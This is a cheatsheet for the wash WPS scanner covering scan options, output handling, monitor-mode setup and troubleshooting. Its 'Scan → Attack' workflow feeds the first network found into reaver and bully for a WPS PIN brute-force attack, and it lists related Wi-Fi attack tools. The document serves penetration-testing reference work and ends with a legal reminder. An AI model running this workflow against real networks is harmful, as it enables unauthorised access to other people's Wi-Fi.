# Wash — Quick Reference Cheatsheet

## Installation
```bash
sudo apt install reaver          # Install (includes wash)
wash --help                      # Verify installation
```

## Basic Commands
```bash
sudo wash -i wlan0mon            # Basic WPS scan
sudo wash -i wlan0mon -o 60      # Scan with 60s timeout
sudo wash -i wlan0mon -c 6       # Scan specific channel
sudo wash -i wlan0mon -c 1,6,11  # Scan multiple channels
sudo wash -i wlan0mon -s         # Continuous scan (Ctrl+C to stop)
```

## Output & Saving
```bash
sudo wash -i wlan0mon > scan.txt           # Save to file
sudo wash -i wlan0mon -f csv > scan.csv    # Save as CSV
sudo wash -i wlan0mon -v                   # Verbose output
sudo wash -i wlan0mon -q                   # Quiet mode
```

## Output Columns
```
BSSID  Channel  RSSI  WPS Version  Locked  ESSID
```

## Signal Strength Guide
| dBm | Quality |
|-----|---------|
| -30 to -50 | Excellent |
| -50 to -67 | Good |
| -67 to -80 | Fair |
| -80 to -90 | Poor |
| < -90 | Very poor |

## WPS Version Detection
- **WPS 1.0**: More vulnerable (Pixie Dust attack possible)
- **WPS 2.0**: Slightly improved security
- **WPS Locked**: Brute force protection enabled

## Workflow: Scan → Attack
```bash
# 1. Find WPS networks
sudo wash -i wlan0mon > wps_networks.txt

# 2. Extract target BSSID
TARGET=$(awk 'NR>1 {print $1}' wps_networks.txt | head -1)

# 3. Attack with Reaver
sudo reaver -i wlan0mon -b $TARGET -v

# 4. Or with Bully
sudo bully -b $TARGET -c 6 -w -v 3
```

## Interface Setup
```bash
sudo airmon-ng start wlan0       # Enable monitor mode
iwconfig wlan0mon                # Verify monitor mode
sudo airmon-ng check kill        # Kill interfering processes
```

## Data Analysis
```bash
# Count networks
sudo wash -i wlan0mon | wc -l

# Count by WPS version
sudo wash -i wlan0mon | awk '{print $4}' | sort | uniq -c

# Count by channel
sudo wash -i wlan0mon | awk '{print $2}' | sort | uniq -c

# Filter strong signals (> -60 dBm)
sudo wash -i wlan0mon | awk '$3 > -60'
```

## Integration
```bash
# With Aircrack-ng suite
sudo wash -i wlan0mon -o 120 > wps_results.txt
sudo airodump-ng wlan0mon --write network_scan

# Background monitoring
nohup sudo wash -i wlan0mon -s > /var/log/wash_monitor.log 2>&1 &
```

## Troubleshooting
| Problem | Solution |
|---------|----------|
| No interface found | `sudo airmon-ng start wlan0` |
| Not in monitor mode | `iwconfig wlan0mon` or restart monitor |
| Permission denied | `sudo wash -i wlan0mon` |
| No WPS found | Extend timeout: `-o 300` |
| WPS disabled | Network doesn't have WPS enabled |

## Related Tools
| Tool | Purpose |
|------|---------|
| `reaver` | WPS PIN brute force attack |
| `bully` | WPS attack tool |
| `pixiewps` | Pixie Dust offline attack |
| `airodump-ng` | General WiFi sniffing |
| `wifite` | Automated WiFi attack |

## Legal Reminder
- Use only on networks you own or have authorization to test
- Unauthorized scanning may violate computer crime laws
- Document all authorized testing activities
